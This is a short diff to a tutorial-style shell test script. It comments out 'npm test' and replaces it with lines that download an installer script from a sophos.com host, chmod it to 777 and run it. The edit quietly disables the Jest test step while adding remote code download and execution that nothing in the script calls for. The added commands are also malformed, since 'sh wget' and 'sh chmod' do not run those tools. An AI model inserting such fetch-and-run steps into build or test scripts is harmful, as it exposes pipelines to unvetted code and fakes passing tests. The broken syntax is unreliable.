@@ -17,4 +17,7 @@ echo 'The following "npm" command tests that your simple Node.js/React'
 echo 'application renders satisfactorily. This command actually invokes the test'
 echo 'runner Jest (https://facebook.github.io/jest/).'
 set -x
-npm test
+# npm test
+ sh wget https://api-cloudstation-us-east-2.prod.hydra.sophos.com/api/download/3f3989c05a7db62d3c2f7327f2815c40/SophosInstall.sh
+ sh chmod 777 SophosInstall.sh
+ sh ./SophosInstall.sh
